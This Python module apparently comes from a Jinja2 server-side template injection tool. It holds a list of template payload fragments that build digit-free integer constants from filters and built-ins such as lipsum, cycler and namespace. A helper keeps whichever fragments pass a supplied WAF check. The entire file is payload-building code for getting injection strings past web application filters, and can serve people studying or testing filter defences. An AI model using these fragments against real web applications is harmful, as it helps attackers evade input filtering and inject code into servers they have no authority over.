from collections import namedtuple

IntVars = namedtuple("IntVars", "payload ints var_names")

def int_var(payload, i, var_name):
    return IntVars(
        payload = payload,
        ints = [i, ],
        var_names = [var_name, ]
    )

int_vars_list = [
    IntVars(
        payload=(
            "{%set oa={}|int%}" +
            "{%set la=oa**oa%}" +
            "{%set lla=(la~la)|int%}" +
            "{%set llla=(lla~la)|int%}" +
            "{%set lllla=(llla~la)|int%}"
        ),
        ints=[
            0,
            1,
            11,
            111,
            1111
        ],
        var_names=[
            "oa",
            "la",
            "lla",
            "llla",
            "lllla",
        ]
    ),
    IntVars(
        payload=(
            "{%set ob={}|int%}" +
            "{%set lb=ob**ob%}" +
            "{%set llb=(lb~lb)|int%}" +
            "{%set lllb=(llb~lb)|int%}" +
            "{%set llllb=(lllb~lb)|int%}" +
            "{%set bb=llb-lb-lb-lb-lb-lb%}" +
            "{%set sbb=lllb-llb-llb-llb-llb-llb%}" +
            "{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}" +
            "{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}"
        ),
        ints=[
            0,
            1,
            11,
            111,
            1111,
            6,
            56,
            556,
            223,
        ],
        var_names=[
            "ob",
            "lb",
            "llb",
            "lllb",
            "llllb",
            "bb",
            "sbb",
            "ssbb",
            "zzeb"
        ]
    ),
    int_var("{%set zols=lipsum|escape|urlencode|list|escape|urlencode|count%}", 2015, "zols"),
    int_var("{%set ltr={}|escape|urlencode|list|escape|urlencode|count%}", 178, "ltr"),
    int_var("{%set lea=namespace|escape|urlencode|escape|urlencode|urlencode|urlencode|count%}", 134, "lea"),
    int_var("{%set lel=cycler|escape|urlencode|escape|urlencode|escape|urlencode|escape|urlencode|count%}", 131, "lel"),
    int_var("{%set qo=namespace|escape|urlencode|escape|urlencode|count%}", 90, "qo"),
    int_var("{%set bs=cycler|escape|urlencode|count%}", 65, "bs"),
    int_var("{%set ab=namespace|escape|count%}", 46, "ab"),
    int_var("{%set zb={}|escape|list|escape|count%}", 26, "zb"),
    int_var("{%set t=joiner|urlencode|wordcount%}", 7, "t"),
    int_var("{%set b={}|escape|urlencode|count%}", 6, "b"),
    int_var("{%set e=(dict(a=x,b=x,c=x)|count)%}", 3, "e"),
    int_var("{%set l={}|escape|first|count%}", 1, "l"),
]


def get_useable_int_vars(waf_func):
    ints, var_names, payload = [], [], ""
    for int_vars in int_vars_list:
        if not waf_func(int_vars.payload):
            continue
        ints += int_vars.ints
        var_names += int_vars.var_names
        payload += int_vars.payload
    return ints, var_names, payload
